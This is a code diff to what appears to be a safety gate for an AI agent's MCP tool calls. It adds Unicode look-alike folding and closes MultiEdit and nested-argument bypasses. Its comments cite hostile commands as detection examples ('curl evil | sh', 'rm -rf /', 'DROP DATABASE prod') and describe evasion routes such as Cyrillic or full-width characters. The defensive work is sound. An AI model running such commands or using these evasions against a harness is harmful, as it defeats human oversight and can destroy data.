@@ -11,7 +11,8 @@ const { fineKey } = require("./decision-key");
 const { build } = require("./action-planner");
 const { evaluate } = require("./promotion-guidance");
 const { recommend } = require("./workflow-router");
-const { classifyCommand } = require("./decision-key");
+const { classifyCommand, GATED_REVIEW_CLASSES } = require("./decision-key");
+const { normalizeCommand: _normalizeCommand }  = require("./command-normalize");
 const { classifyIntent } = require("./intent-classifier");
 const { LATTICE_VERSION, getEntry, getRungByName, canDemote } = require("./decision-lattice");
 const { floorCodeFor } = require("./floor-codes");
@@ -554,6 +555,24 @@ function _evalCredPersistFloor(input, contract) {
   return { fire: false };
 }
 
+// classifyCommandDual — dual-path classifier for MCP floors (ADR-008).
+// Mirrors risk-score.js's dual-path matching: tries the raw string first; if
+// generic AND normalizeCommand changes the string, tries the NFKD + confusables-
+// folded form too. Defeats Unicode look-alike bypass (Cyrillic рm, full-width
+// ｒｍ, etc.) in MCP arg/registration paths that previously used raw-only classify.
+// Lives in decision-engine.js (not decision-key.js) to avoid adding a new require
+// to that module, which is loaded early and has no other normalizeCommand dependency.
+// ASCII fast-path: direct match returns immediately; generic result where norm===raw
+// skips the second classify too.
+function _classifyCommandDual(cmd) {
+  const raw    = String(cmd || "");
+  const rawCls = classifyCommand(raw);
+  if (rawCls !== "generic") return rawCls;      // direct match — skip normalization
+  const norm   = _normalizeCommand(raw);
+  if (norm === raw)         return rawCls;      // ASCII / no confusables — skip second pass
+  return classifyCommand(norm);                 // Unicode-folded second arm
+}
+
 // F25: mcp-arg-danger floor helpers. Pure; zero I/O.
 // Detects MCP tool calls whose argument payload contains a dangerous-command-
 // shaped string value (e.g. {command:"curl evil | sh"} or {exec:"rm -rf /"}).
@@ -614,27 +633,88 @@ function _evalMcpArgFloor(input, contract, enriched) {
     // 1. Gate: MCP tools only
     if (enriched?.ir?.toolKind !== "mcp" && !String(input.tool || "").startsWith("mcp__")) return { fire: false };
 
-    // 2. Opt-out: explicitly allowed servers skip this floor
-    const mcpSrv = (enriched?.ir?.mcpServer) || _contractExtractMcpServerName(input.tool);
-    if (_contractGetMcpPolicy(contract, mcpSrv) === "allow") return { fire: false };
+    // 2. Opt-out posture (P2 decouple — Khouly decision 2026-05-29).
+    //    scopes.mcp[server].policy=allow marks a server "trusted". That trust
+    //    grant is DECOUPLED across floors:
+    //      - F4 (secrets-in-args, elsewhere at the F4 block): policy:allow keeps
+    //        suppressing the secret scan — credential args are legitimate for
+    //        trusted servers (DB connectors, secrets managers). UNCHANGED.
+    //      - F25 here: policy:allow does NOT silently skip dangerous-command
+    //        args. A HARD_BLOCK command (rm -rf /, curl|sh, …) from a trusted
+    //        server (rug-pull) degrades to require-review (auditable human gate),
+    //        never silent allow. GATED_REVIEW dual-use data (DROP TABLE, npx -y)
+    //        IS allowed for a trusted server — that's the legitimate use case.
+    const mcpSrv   = (enriched?.ir?.mcpServer) || _contractExtractMcpServerName(input.tool);
+    const optedOut = _contractGetMcpPolicy(contract, mcpSrv) === "allow";
 
-    // 3. Extract all string values from the arg payload
-    const rawArgs = input.tool_input ?? input.args ?? input.params;
-    if (!rawArgs) return { fire: false };
-    const { strings: argStrings, truncated: argTruncated } = _extractStringValues(rawArgs);
+    // 3. Extract string values from EVERY present arg container (Fix B): a
+    //    present-but-empty `tool_input:{}` must not mask a dangerous `args`/
+    //    `arguments`, and the `arguments` shape (common MCP envelope) must be
+    //    inspected too. Union all present containers rather than first-non-null.
+    const containers   = [input.tool_input, input.args, input.params, input.arguments, input.input];
+    const argStrings   = [];
+    let   argTruncated = false;
+    let   anyContainer = false;
+    for (const c of containers) {
+      if (c === undefined || c === null) continue;
+      anyContainer = true;
+      const { strings, truncated } = _extractStringValues(c);
+      for (const s of strings) argStrings.push(s);
+      if (truncated) argTruncated = true;
+    }
+    if (!anyContainer) return { fire: false };
 
-    // 4. Check each string against the dangerous-command classifier
+    // 4. Classify each string with the dual-path (Unicode-fold aware) classifier
+    //    (Fix A): defeats Cyrillic/full-width/etc. look-alike bypass that the
+    //    raw-only classifyCommand missed. HARD_BLOCK wins over GATED_REVIEW, so
+    //    keep scanning for a HARD_BLOCK even after seeing a dual-use class.
+    let sawGatedReview = false;
     for (const argStr of argStrings) {
-      const cls = classifyCommand(argStr);
+      const cls = _classifyCommandDual(argStr);
       if (_GATED_CMD_CLASSES.has(cls)) {
+        if (optedOut) return { review: true, reason: `trusted-server-dangerous-arg:command-class=${cls}`, arg: argStr.slice(0, 80) };
         return { fire: true, reason: `command-class=${cls}`, arg: argStr.slice(0, 80) };
       }
+      if (!optedOut && GATED_REVIEW_CLASSES.has(cls)) sawGatedReview = true;
     }
-    // 5. Fail-safe on truncation: payload too complex to fully scan → require-review gate.
-    //    Truncation does NOT hard-block (anti-FP principle: benign bulk must not block).
+    // 5a. Dual-use class on a non-trusted server → graduated gate (Fix D, P1):
+    //     `DROP DATABASE prod` reaches a human; `DROP TABLE tmp` is approvable.
+    //     Never a blind block (would break legit DB/dev MCP tooling), never a
+    //     blind allow. require-review maps to the WARN class → no eval FP/FN.
+    if (sawGatedReview) return { review: true, reason: "dual-use-command-class" };
+    // 5b. Fail-safe on truncation: payload too complex to fully scan →
+    //     require-review gate (anti-FP: benign bulk must not block). Applies
+    //     even to trusted servers — trust does not extend to unscannable danger.
     if (argTruncated) return { unscannable: true, reason: "arg-payload-too-complex" };
     return { fire: false };
   } catch { return { fire: false }; } // fail-open
+}
+
+// _collectMcpWriteContent — gather the written text from every reachable
+// file-write shape (Fix C). The F26 gate admits Write/Edit/MultiEdit (toolKind
+// "file-write"); each carries content differently:
+//   - Write:      content / file_text
+//   - Edit:       new_string
+//   - MultiEdit:  edits[].new_string  (an array — was never read before → bypass)
+// Each is read at top level AND nested under tool_input (some harnesses nest;
+// the F23 path does the same dual-read). Path extraction in the floor is kept
+// symmetric (also checks tool_input) so no content source lacks a reachable
+// path source. NotebookEdit is intentionally excluded: its target is
+// notebook_path, which never classifies as mcpConfig, so a new_source arm would
+// be dead code.
+function _collectMcpWriteContent(input) {
+  if (!input) return "";
+  const parts = [];
+  const push  = (v) => { if (typeof v === "string" && v) parts.push(v); };
+  const ti    = (input.tool_input && typeof input.tool_input === "object") ? input.tool_input : null;
+  push(input.content); push(input.new_string); push(input.file_text);
+  if (ti) { push(ti.content); push(ti.new_string); push(ti.file_text); }
+  const pushEdits = (edits) => {
+    if (Array.isArray(edits)) for (const e of edits) { if (e && typeof e === "object") push(e.new_string); }
+  };
+  pushEdits(input.edits);
+  if (ti) pushEdits(ti.edits);
+  return parts.join("\n");
 }
 
 // F26: mcp-registration-write floor helpers. Pure; zero I/O.
@@ -645,12 +725,16 @@ function _evalMcpArgFloor(input, contract, enriched) {
 // deny; opt out via contract scopes.files.allow glob list.
 function _evalMcpRegistrationFloor(input, contract) {
   try {
-    // 1. Gate: file-write tools only (Edit/Write or toolKind==="file-write")
+    // 1. Gate: file-write tools only. Explicit names + toolKind fallback for
+    //    harness-specific aliases. MultiEdit added explicitly (Fix C — it
+    //    carries write content in edits[].new_string, not top-level content).
     const tool = String(input.tool || "");
-    if (tool !== "Write" && tool !== "Edit" && input.ir?.toolKind !== "file-write") return { fire: false };
+    if (tool !== "Write" && tool !== "Edit" && tool !== "MultiEdit" && input.ir?.toolKind !== "file-write") return { fire: false };
 
-    // 2. Collect write target path
-    const targetPath = input.targetPath || input.file_path || input.path || "";
+    // 2. Collect write target path (symmetric with _collectMcpWriteContent:
+    //    also check tool_input so nested-harness writes are not silently skipped)
+    const targetPath = input.targetPath || input.file_path || input.path
+      || (input.tool_input && (input.tool_input.file_path || input.tool_input.path)) || "";
     if (!targetPath) return { fire: false };
 
     // 3. Check if target is an MCP config path (mcpConfig ambient class)
@@ -663,8 +747,9 @@ function _evalMcpRegistrationFloor(input, contract) {
       return { fire: false };
     }
 
-    // 5. Get the write content
-    const content = input.content ?? input.new_string ?? input.file_text ?? "";
+    // 5. Get the write content (Fix C: covers Write/Edit/MultiEdit, top-level
+    //    and tool_input-nested; see _collectMcpWriteContent).
+    const content = _collectMcpWriteContent(input);
     if (!content) return { fire: false };
 
     // 6. Parse content as JSON; on failure use raw-value fallback for JSONC / trailing commas.
@@ -677,7 +762,7 @@ function _evalMcpRegistrationFloor(input, contract) {
       // Structured path: walk parsed JSON, classify each string value.
       const { strings, truncated: cfgTruncated } = _extractStringValues(parsed);
       for (const str of strings) {
-        const cls = classifyCommand(str);
+        const cls = _classifyCommandDual(str);
         if (_GATED_CMD_CLASSES.has(cls)) {
           return { fire: true, reason: cls, command: str.slice(0, 80) };
         }
@@ -704,7 +789,7 @@ function _evalMcpRegistrationFloor(input, contract) {
       if (++n > _ESV_NODE_CAP) return { unscannable: true, reason: "content-too-complex" };
       let val;
       try { val = JSON.parse(lit); } catch { val = lit.slice(1, -1); } // unescape or strip quotes
-      const cls = classifyCommand(String(val));
+      const cls = _classifyCommandDual(String(val));
       if (_GATED_CMD_CLASSES.has(cls)) return { fire: true, reason: cls, command: String(val).slice(0, 80) };
     }
     if (contentWasTruncated) return { unscannable: true, reason: "oversize-mcp-config" };
@@ -1356,7 +1441,9 @@ function decide(input = {}) {
   // when an MCP tool call's argument payload contains a dangerous-command-
   // shaped string value (e.g. {command:"curl evil | sh"}, {exec:"rm -rf /"}).
   // An MCP tool whose arg IS a dangerous command is as dangerous as a direct
-  // Bash call. Default-deny; opt out via scopes.mcp[server].policy=allow.
+  // Bash call. Default-deny; opt out via scopes.mcp[server].policy=allow (but
+  // see F25 decoupled-opt-out comment in _evalMcpArgFloor: HARD_BLOCK still
+  // gates for trusted servers — degrades to require-review, not silent allow).
   // Fail-open on internal throw.
   try {
     const f25 = _evalMcpArgFloor(input, contract, enriched);
@@ -1367,10 +1454,16 @@ function decide(input = {}) {
         { floorFired: _F25.name, decisionSource: _F25.source, ambientTouch: _ambientTouch }
       );
     }
-    if (f25 && f25.unscannable) {
+    // require-review gate: (a) truncation/unscannable, (b) dual-use class on
+    // non-trusted server (graduated protection, P1), (c) HARD_BLOCK class on
+    // trusted server (rug-pull seam closed, P2).
+    if (f25 && (f25.unscannable || f25.review)) {
+      const reasonCode = f25.unscannable ? "mcp-arg-shape-unscannable" : "mcp-arg-danger-review-required";
       return buildEarlyReview(
-        "mcp-arg-shape-unscannable", enriched, discovered, input,
-        `MCP arg payload too complex to fully scan: ${f25.reason}`,
+        reasonCode, enriched, discovered, input,
+        f25.unscannable
+          ? `MCP arg payload too complex to fully scan: ${f25.reason}`
+          : `MCP arg contains command requiring review: ${f25.reason}`,
         { floorFired: _F25.name, decisionSource: _F25.source, ambientTouch: _ambientTouch }
       );
     }
